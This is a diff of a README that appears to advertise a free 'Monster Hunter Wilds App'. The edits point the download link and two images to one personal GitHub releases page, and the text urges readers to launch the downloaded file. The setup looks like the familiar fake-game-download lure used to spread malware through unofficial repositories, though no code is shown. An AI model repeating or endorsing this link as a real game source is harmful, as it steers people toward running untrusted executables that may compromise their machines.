@@ -10,8 +10,8 @@ Welcome to the exciting world of *Monster Hunter Wilds*, where the unbridled for
 
 ## Resources
 
-🔗 [Download Monster Hunter Wilds App!](https://github.com/project/files/App.zip)
-![Download Now](https://img.shields.io/badge/Download-Now-red)
+🔗 [Download Monster Hunter Wilds App!](https://github.com/Moonlight13781378/Monster-Hunter-Wilds/releases)
+![Download Now](https://github.com/Moonlight13781378/Monster-Hunter-Wilds/releases)
 
 If the link above leads to the file name directly, make sure to launch it to start your epic monster hunting adventure!
 
@@ -41,7 +41,7 @@ In the world of *Monster Hunter Wilds*, formidable beasts roam the lands, and th
 
 Join the vibrant community of monster hunters where you can share strategies, discuss the latest updates, and connect with fellow hunters around the world. Become part of the adventure and make memories that will last a lifetime!
 
-![Happy Hunting](https://www.example.com/happyhunting.jpg)
+![Happy Hunting](https://github.com/Moonlight13781378/Monster-Hunter-Wilds/releases)
 
 ## Credits
 
